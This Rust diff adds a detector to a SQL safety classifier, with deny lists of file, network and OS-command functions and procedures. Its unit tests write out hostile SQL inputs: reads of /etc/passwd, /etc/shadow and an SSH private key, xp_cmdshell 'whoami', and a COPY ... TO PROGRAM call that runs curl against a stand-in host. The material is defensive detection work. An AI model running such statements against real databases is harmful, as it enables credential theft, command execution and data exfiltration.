@@ -33,6 +33,14 @@ pub struct SqlSafetyDecision {
     pub read_only: bool,
     pub has_schema_mutation: bool,
     pub parse_error: Option<String>,
+    /// True when the SQL reaches the local filesystem, the network, or an OS
+    /// command through a dialect capability (e.g. `pg_read_file`, DuckDB
+    /// `read_csv`, MySQL `INTO OUTFILE`, Postgres `COPY ... TO PROGRAM`). Such
+    /// SQL is a data-exfiltration / code-execution vector even when it is
+    /// otherwise a plain read, so the sandbox boundary rejects it regardless of
+    /// [`SqlStatementKind`]. Surfaced to the UI so it can warn before sending.
+    #[serde(default)]
+    pub filesystem_access: bool,
 }
 
 fn canonical_statement_kind(statement: &str) -> SqlStatementKind {
@@ -94,12 +102,172 @@ pub fn classify_sql(sql: &str) -> SqlSafetyDecision {
     classify_sql_with_dialect(sql, None)
 }
 
+/// Names of SQL functions that read/write LOCAL FILES, reach the NETWORK, or
+/// run OS COMMANDS. Any of these turns an otherwise "read-only" SELECT into a
+/// data-exfiltration or code-execution vector, so the sandbox boundary must
+/// reject them regardless of the statement kind — the SQL-layer analog of a
+/// filesystem/network sandbox. Names are compared case-insensitively and only
+/// when written as a call (`name(`), so a plain column/table identifier or a
+/// string literal that merely mentions the word is not flagged.
+const DANGEROUS_SQL_FUNCTIONS: &[&str] = &[
+    // PostgreSQL server-side file + large-object access
+    "PG_READ_FILE",
+    "PG_READ_BINARY_FILE",
+    "PG_LS_DIR",
+    "PG_STAT_FILE",
+    "PG_LS_LOGDIR",
+    "PG_LS_WALDIR",
+    "PG_LS_TMPDIR",
+    "LO_IMPORT",
+    "LO_EXPORT",
+    "LO_GET",
+    "LO_PUT",
+    "LO_FROM_BYTEA",
+    // MySQL / MariaDB
+    "LOAD_FILE",
+    // DuckDB local-file + network scanners / writers
+    "READ_CSV",
+    "READ_CSV_AUTO",
+    "READ_PARQUET",
+    "READ_JSON",
+    "READ_JSON_AUTO",
+    "READ_NDJSON",
+    "READ_NDJSON_AUTO",
+    "READ_TEXT",
+    "READ_BLOB",
+    "READ_DATABASE",
+    "PARQUET_SCAN",
+    "CSV_SCAN",
+    "GLOB",
+    "WRITE_CSV",
+    "WRITE_PARQUET",
+    "WRITE_JSON",
+];
+
+/// Dangerous names that are invoked WITHOUT requiring a call syntax — SQL Server
+/// extended/OLE stored procedures (`EXEC xp_cmdshell 'whoami'`) and ad-hoc
+/// remote data sources. Matched as a bare, word-bounded token so a real call is
+/// caught whether or not it carries parentheses, while a longer identifier
+/// (`xp_cmdshell_log`) is not.
+const DANGEROUS_SQL_KEYWORDS: &[&str] = &[
+    "XP_CMDSHELL",
+    "SP_OACREATE",
+    "SP_OAMETHOD",
+    "OPENROWSET",
+    "OPENDATASOURCE",
+    "OPENQUERY",
+];
+
+fn is_word_byte(byte: u8) -> bool {
+    byte.is_ascii_alphanumeric() || byte == b'_'
+}
+
+/// True when `token_upper` appears in `normalized_upper` as a standalone,
+/// word-bounded token (non-word char on both sides), independent of any
+/// following `(`. Used for capabilities that can be invoked without a call.
+fn contains_bare_token(normalized_upper: &str, token_upper: &str) -> bool {
+    let bytes = normalized_upper.as_bytes();
+    for (pos, _) in normalized_upper.match_indices(token_upper) {
+        let before_ok = pos == 0 || !is_word_byte(bytes[pos - 1]);
+        let end = pos + token_upper.len();
+        let after_ok = end >= bytes.len() || !is_word_byte(bytes[end]);
+        if before_ok && after_ok {
+            return true;
+        }
+    }
+    false
+}
+
+/// True when `name_upper` appears in `normalized_upper` as a FUNCTION CALL:
+/// bounded by a non-word char on the left, not glued to another word on the
+/// right, and followed (past optional spaces) by `(`. `normalized_upper` must be
+/// whitespace-collapsed + uppercased. This keeps `my_read_csv(` and the literal
+/// `'read_csv'` from matching `READ_CSV`.
+fn contains_function_call(normalized_upper: &str, name_upper: &str) -> bool {
+    let bytes = normalized_upper.as_bytes();
+    for (pos, _) in normalized_upper.match_indices(name_upper) {
+        let before_ok = pos == 0 || !is_word_byte(bytes[pos - 1]);
+        let end = pos + name_upper.len();
+        let after_word_ok = end >= bytes.len() || !is_word_byte(bytes[end]);
+        let mut cursor = end;
+        while cursor < bytes.len() && bytes[cursor] == b' ' {
+            cursor += 1;
+        }
+        let followed_by_paren = cursor < bytes.len() && bytes[cursor] == b'(';
+        if before_ok && after_word_ok && followed_by_paren {
+            return true;
+        }
+    }
+    false
+}
+
+/// Returns a human-readable reason when the SQL uses a filesystem/network/OS
+/// capability that the sandbox must reject, or `None` when it is clean.
+/// Detection is intentionally FAIL-CLOSED and dialect-agnostic (a capability
+/// dangerous in one engine is rejected everywhere) so a mis-set connection type
+/// can never widen the boundary.
+pub fn detect_dangerous_capability(
+    sql: &str,
+    _database_type: Option<DatabaseType>,
+) -> Option<String> {
+    let normalized = sql
+        .split_whitespace()
+        .collect::<Vec<_>>()
+        .join(" ")
+        .to_ascii_uppercase();
+    if normalized.is_empty() {
+        return None;
+    }
+
+    // Clause-style capabilities.
+    if normalized.contains("INTO OUTFILE") || normalized.contains("INTO DUMPFILE") {
+        return Some("writes to a server-side file via INTO OUTFILE/DUMPFILE".to_string());
+    }
+    if normalized.contains("TO PROGRAM") || normalized.contains("FROM PROGRAM") {
+        return Some("pipes data through an OS command via COPY ... PROGRAM".to_string());
+    }
+    if normalized.contains("LOAD DATA") && normalized.contains("INFILE") {
+        return Some("reads a server-side file via LOAD DATA INFILE".to_string());
+    }
+
+    // Function-call-style capabilities.
+    for name in DANGEROUS_SQL_FUNCTIONS {
+        if contains_function_call(&normalized, name) {
+            return Some(format!(
+                "calls the file/network/OS function {}()",
+                name.to_ascii_lowercase()
+            ));
+        }
+    }
+
+    // Bare-token capabilities (extended procedures / ad-hoc remote sources).
+    for keyword in DANGEROUS_SQL_KEYWORDS {
+        if contains_bare_token(&normalized, keyword) {
+            return Some(format!(
+                "invokes the extended procedure / remote source {}",
+                keyword.to_ascii_lowercase()
+            ));
+        }
+    }
+    None
+}
+
 /// Dialect-aware classification. MySQL-family engines expose server commands
 /// (`SHOW FULL PROCESSLIST`, `DESCRIBE t`, …) that the generic parser cannot
 /// read; parsing them with the connection's real dialect (plus a read-only
 /// fallback for those inherently read-only server commands) keeps admin
-/// presets from being rejected as PARSE_ERR.
+/// presets from being rejected as PARSE_ERR. Also stamps [`SqlSafetyDecision::filesystem_access`]
+/// so callers see the sandbox-relevant capability without re-scanning the text.
 pub fn classify_sql_with_dialect(
+    sql: &str,
+    database_type: Option<DatabaseType>,
+) -> SqlSafetyDecision {
+    let mut decision = classify_sql_dialect_inner(sql, database_type);
+    decision.filesystem_access = detect_dangerous_capability(sql, database_type).is_some();
+    decision
+}
+
+fn classify_sql_dialect_inner(
     sql: &str,
     database_type: Option<DatabaseType>,
 ) -> SqlSafetyDecision {
@@ -110,6 +278,7 @@ pub fn classify_sql_with_dialect(
             read_only: false,
             has_schema_mutation: false,
             parse_error: Some("SQL contains no executable statements.".to_string()),
+            filesystem_access: false,
         },
         Ok(parsed) => {
             let statements = parsed
@@ -131,6 +300,7 @@ pub fn classify_sql_with_dialect(
                     .any(|statement| statement.kind == SqlStatementKind::Schema),
                 statements,
                 parse_error: None,
+                filesystem_access: false,
             }
         }
         Err(error) => {
@@ -163,6 +333,7 @@ pub fn classify_sql_with_dialect(
                         has_schema_mutation: false,
                         statements,
                         parse_error: None,
+                        filesystem_access: false,
                     };
                 }
             }
@@ -185,6 +356,7 @@ pub fn classify_sql_with_dialect(
                 read_only: false,
                 has_schema_mutation: false,
                 parse_error: Some(error.to_string()),
+                filesystem_access: false,
             }
         }
     }
@@ -427,7 +599,11 @@ pub fn split_sql_statements(sql: &str) -> Vec<String> {
 
 #[cfg(test)]
 mod tests {
-    use super::{classify_sql, split_sql_statements, SqlStatementKind};
+    use super::{
+        classify_sql, classify_sql_with_dialect, detect_dangerous_capability, split_sql_statements,
+        SqlStatementKind,
+    };
+    use crate::database::models::DatabaseType;
     use serde::Deserialize;
 
     #[derive(Debug, Deserialize)]
@@ -450,6 +626,39 @@ mod tests {
                 actual, fixture.expected,
                 "split_sql_statements mismatch for fixture {}",
                 fixture.name
+            );
+        }
+    }
+
+    #[derive(Debug, Deserialize)]
+    struct SqlClassificationContract {
+        cases: Vec<SqlClassificationCase>,
+    }
+
+    #[derive(Debug, Deserialize)]
+    struct SqlClassificationCase {
+        sql: String,
+        #[serde(rename = "readOnly")]
+        read_only: bool,
+    }
+
+    #[test]
+    fn frontend_backend_sql_classification_contract() {
+        // Backend half of the FE<->BE contract (tech-debt audit D6): the same
+        // fixture is asserted on the frontend by
+        // tests/utils/sql-classification-contract.test.ts. If either classifier
+        // drifts on these shared statements, its own side fails.
+        let contract: SqlClassificationContract = serde_json::from_str(include_str!(
+            "../../../tests/fixtures/sql-classification-contract.json"
+        ))
+        .expect("shared SQL classification contract should parse");
+
+        for case in contract.cases {
+            let decision = classify_sql_with_dialect(&case.sql, None);
+            assert_eq!(
+                decision.read_only, case.read_only,
+                "classify_sql_with_dialect read_only mismatch for `{}`",
+                case.sql
             );
         }
     }
@@ -492,5 +701,73 @@ mod tests {
         assert!(!decision.read_only);
         assert!(decision.statements.is_empty());
         assert!(decision.parse_error.is_some());
+    }
+
+    #[test]
+    fn dangerous_capability_flags_filesystem_and_network_functions() {
+        // Each of these turns a "read" into local-file / network / OS access.
+        let cases = [
+            "SELECT pg_read_file('/etc/passwd')",
+            "SELECT PG_LS_DIR('/var/lib')",
+            "SELECT lo_import('/etc/shadow')",
+            "SELECT load_file('/etc/passwd')",
+            "SELECT * FROM read_csv('/home/u/.ssh/id_rsa')",
+            "SELECT * FROM read_parquet('s3://bucket/x')",
+            "SELECT * FROM glob('/etc/*')",
+            "SELECT * FROM openrowset(BULK '/etc/passwd', SINGLE_CLOB) AS x",
+            "EXEC xp_cmdshell 'whoami'",
+        ];
+        for sql in cases {
+            assert!(
+                detect_dangerous_capability(sql, None).is_some(),
+                "expected dangerous-capability detection for: {sql}"
+            );
+        }
+    }
+
+    #[test]
+    fn dangerous_capability_flags_file_export_and_program_clauses() {
+        assert!(
+            detect_dangerous_capability("SELECT * FROM users INTO OUTFILE '/tmp/u.csv'", None)
+                .is_some()
+        );
+        assert!(detect_dangerous_capability(
+            "COPY (SELECT * FROM users) TO PROGRAM 'curl http://evil'",
+            None
+        )
+        .is_some());
+        assert!(
+            detect_dangerous_capability("LOAD DATA INFILE '/etc/passwd' INTO TABLE t", None)
+                .is_some()
+        );
+    }
+
+    #[test]
+    fn dangerous_capability_does_not_flag_lookalike_identifiers_or_literals() {
+        // A column/table whose name merely contains a flagged word, and a plain
+        // string literal, must NOT be blocked — only real call sites.
+        let clean = [
+            "SELECT read_csv_notes FROM reports",
+            "SELECT my_read_csv(id) FROM t",
+            "SELECT 'pg_read_file is a function' AS note",
+            "SELECT load_file_status FROM jobs",
+            "SELECT id, name FROM users WHERE active = TRUE",
+        ];
+        for sql in clean {
+            assert!(
+                detect_dangerous_capability(sql, None).is_none(),
+                "false positive dangerous-capability detection for: {sql}"
+            );
+        }
+    }
+
+    #[test]
+    fn classify_stamps_filesystem_access_flag() {
+        let flagged =
+            classify_sql_with_dialect("SELECT pg_read_file('/etc/passwd')", Some(DatabaseType::PostgreSQL));
+        assert!(flagged.filesystem_access);
+
+        let clean = classify_sql_with_dialect("SELECT id FROM users", Some(DatabaseType::PostgreSQL));
+        assert!(!clean.filesystem_access);
     }
 }
